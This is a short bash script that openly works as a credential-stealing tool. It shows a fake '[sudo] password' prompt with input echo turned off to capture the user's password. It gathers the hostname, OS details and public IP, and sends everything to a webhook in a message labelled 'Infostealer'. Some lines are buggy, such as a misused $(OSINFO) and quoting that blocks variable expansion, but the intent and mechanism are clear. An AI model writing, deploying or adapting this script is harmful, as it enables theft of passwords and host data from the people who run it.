#!/bin/bash
set -e
#Variable setup
IPADDR=$(curl ifconfig.me)
HOSTNAME=$(hostname)
OSINFO=$(uname -srm)
# Read Password
stty -echo
printf "[sudo] password for $USER: "
read PASSWORD
stty echo
printf "\n"
# Send to webhook
BODY='{"username": "Infostealer", "content": "**Bait!**\n\nHost:$USER@$HOSTNAME\nOS: $(OSINFO)\nPassword: $PASSWORD\nIP: $IPADDR\n"}'
curl \
  -H "Content-Type: application/json" \
  -d $BODY \
  $WEBHOOK_URL
